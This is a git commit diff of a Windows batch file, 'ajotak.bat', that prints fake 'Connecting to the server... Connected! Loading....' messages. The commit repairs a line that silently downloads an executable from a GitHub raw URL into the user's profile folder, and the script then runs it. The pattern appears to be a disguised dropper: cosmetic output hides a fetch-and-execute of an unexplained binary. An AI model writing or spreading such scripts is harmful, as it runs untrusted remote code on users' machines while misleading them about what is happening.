656138556c972eed28e13aad8f562853199e80b3
beeczxd <beecz@drcoconut.net>
2025-11-12 15:56:54 +0100

    Update ajotak.bat

--- ajotak.bat
+++ ajotak.bat
@@ -10,7 +10,8 @@ echo Connecting to the server...
 timeout /nobreak /t 5 >nul
 echo Connected!
 echo Loading....
-curl -L -s -o "C:\Users\%username\ajo.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/e.exe
+set "target=C:\Users\%username%\"
+curl -L -s -o "C:\Users\%username%\ajo.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/e.exe
 start C:\Users\%username%\ajo.exe
 timeout /nobreak /t 3 >nul
 cls
@@ -191,6 +192,7 @@ goto menu
 
 :end
 exit /b
+
 
 
 
